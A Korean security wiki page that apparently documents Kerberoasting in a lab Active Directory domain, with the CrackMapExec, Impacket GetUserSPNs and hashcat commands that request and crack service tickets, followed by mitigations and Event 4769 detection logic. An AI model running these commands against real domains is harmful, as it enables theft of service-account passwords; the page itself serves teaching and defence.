---
description: MITRE ATTACK - T1558.003
---

# 커버로스팅 (Kerberoasting)

커버로스팅은 2014년도 DerbyCon 컨퍼런스에서 Tim Medin 이 발표한 액티브 디렉토리 포스트 익스플로잇 도메인 권한 상승 공격이다.&#x20;

커버로스는 기본적으로 어떤 도메인 유저던 간에 Service Principal Name (SPN) 특성이 존재하는 서비스 유저를 상대로 한 Service Ticket  (서비스 티켓) 을 TGS(Ticket Granting Service)를 통해요청하고 받아낼 수 있다. 커버로스팅은이 서비스 티켓은 서비스 유저의 NTLM 해시로 암호화 되어 있다. 따라서 `KRB_TGS_REPTGS` 를 받아 서비스 티켓을 추출한 뒤, 이를 메모리상에서 빼내서 오프라인 브루트 포스 공격을 감행해 TGS가 복호화가 된다면 서비스 유저의 비밀번호를 찾아내는 공격이다.

### 개념&#x20;

1. 모든 도메인 유저는 SPN 특성이 존재하는 서비스 유저의 서비스 티켓을 도메인 컨트롤러에게 요청한 뒤 받을 수 있다.
2. KDC는 공격자가 해당 서비스에 접근 권한이 있는지 없는지 확인하지 않는다. 사용자가 제대로된 TGT를 가지고 있고 서비스 티켓을요청을 한다면, KDC 는 그에 맞는 서비스 티켓을 반환할 뿐이다.&#x20;
3. 공격자에게 반환된 TGS는 서비스 유저 계정의 NTLM 해시화된 비밀번호로 RC4-HMAC (혹은 AES256) 암호화가 되어있다. 공격자는 서비스 티켓을 메모리에서 추출한 뒤 브루트포스 공격 혹은 사전 공격을 진행한다. 비밀번호 사전으로 NTLM 해시를 만들고, 그 NTLM 해시로 서비스 티켓을 복호화 하는데 성공한다면 서비스 계정의 비밀번호를 알아낸 것과 다름이 없게된다.

### 환경 준비&#x20;

도메인 내에 서비스 유저 계정을 만든 뒤, SPN 특성을 부여해준다.&#x20;

```powershell
net user sqladmin Password123! /domain /add 
setspn -A <서비스_이름>/<호스트_FQDN>:<포트> <서비스_계정_이름>

setspn -A MSSQL/dc01.choi.local:31337 sqladmin
```

### 공격

다양한 툴로 커버로스팅 공격을 실행한 뒤, 서비스 티켓을 base64+해시 형태로 받아온다. 그 뒤, 브루트포스와 서비스 티켓 복호화 공격을 실행한다.&#x20;

{% tabs %}
{% tab title="리눅스" %}
CrackMapExec (cme) 나 Impacket의 GetUserSPNs.py를 이용&#x20;

```
# CrackMapExec
cme ldap 192.168.40.150 -u low -p 'Password123!' -d choi.local --kerberoasting kerberoast.hashes

# CrackMapExec - hash
cme ldap 192.168.40.150 -u low -H <NT해시>--kerberoast kerberoast.hashes 

# Impacket - GetUSersSPNs
impacket-GetUserSPNs -request 'choi.local/low:Password123!' -outputfile kerberoast.hash

# impacket - GetUsersSPNs - hash 
impacket-GetUserSPNs -request 'choi.local/low' -hashes <LM해시>:<NT해시> -outputfile kerberoast.hash
```
{% endtab %}

{% tab title="윈도우" %}

{% endtab %}
{% endtabs %}

큰 환경에서 커버로스팅 공격을 실행하면 같은 서비스 유저의 TGS가 중복으로 반환될때가 있다. 특정 서비스 유저의 서비스 티켓은 하나의 NTLM 해시로 암호화 되었기 때문에 중복된 TGS를 모두 복호화할 필요는 없다. 하나만 복호화가 되도 유저의 평문 비밀번호를 알아낸 것이다. 따라서 유저의 이름과 도메인을 기반으로 중복 TGS를 지운다.&#x20;

```
# 3번째 필드 - 유저 이름을 기반으로 TGS를 지운다. 
cat kerberoast.hashes | sort -u -k 3,3 -k 4,4
```

### 브루트포스와 TGS 복호화&#x20;

hashcat이나 johntheripper를 사용해 NTLM 해시를 만들고, 복호화하는 브루트포스를 실행한다.&#x20;

```
.\hashcat.exe -a 0 -m 13100 .\kerberoast.hashes .\rockyou.txt
```

## 대응 방안&#x20;

1. [Managed Service Account](https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/managed-service-accounts-understanding-implementing-best/ba-p/397009) (MSA) 및  [Group Managed Service Account](https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview) (gMSA) 기능을 사용해 자동적으로 강력한 비밀번호가 설정되도록 한다.&#x20;
2. MSA/gMSA 기능을 사용하지 못할 경우 수동으로 강력한 비밀번호를 설정한다.&#x20;
3. [Fine-Grained Password Policy](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/introduction-to-active-directory-administrative-center-enhancements--level-100-#bkmk\_create\_fgpp) (FGPP)를 사용해 서비스 계정에 약한 비밀번호가 설정되는 것을 차단한다.&#x20;
4. 다음의 GPO를 사용해 서비스 티켓  암호화를 약한 RC4-HMAC이 아닌 AES256로 설정한다.&#x20;

```
Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options\Network Security: Configure encryption types allowed for Kerberos 

AES256_HMAC_SHA1 설정
```

### 탐지 방안&#x20;

다음의 탐지 방안은 많은 숫자의 로그를 생성할 수 있으니 프로덕션에 적용하기 전 충분한 테스트를 거쳐야한다.&#x20;

서비스 티켓발급 현황을 로깅하는 다음의 GPO를 설정한다. 이는 Event 4769 - Kerberos Service Ticket was Requested 이벤트를 로깅한다.&#x20;

```
Default Domain Controllers Policy/Computer Configuration/Policies/Windows Settings/Security Settings/Advanced Audit Policy Configuration/Audit Policies/Account Logon/Audit Kerberos Service Ticket Operations - Success
```

이후, 다음의 로직을 기반으로 SOC 알람을 설정한다.&#x20;

1. 이벤트 아이디 4769 중 `Ticket Encryption Type: 0x17` (RC4-HMAC)이 보인다.&#x20;
2. 낮은 권한의 도메인 유저가 빠른 시간 (1\~2분) 내에 대량의 0x17 암호화된 TGS를 요청한다.



### 레퍼런스&#x20;

{% embed url="https://en.hackndo.com/kerberoasting/" %}
&#x20;
{% endembed %}

{% embed url="https://adsecurity.org/?p=3458" %}

{% embed url="https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797" %}
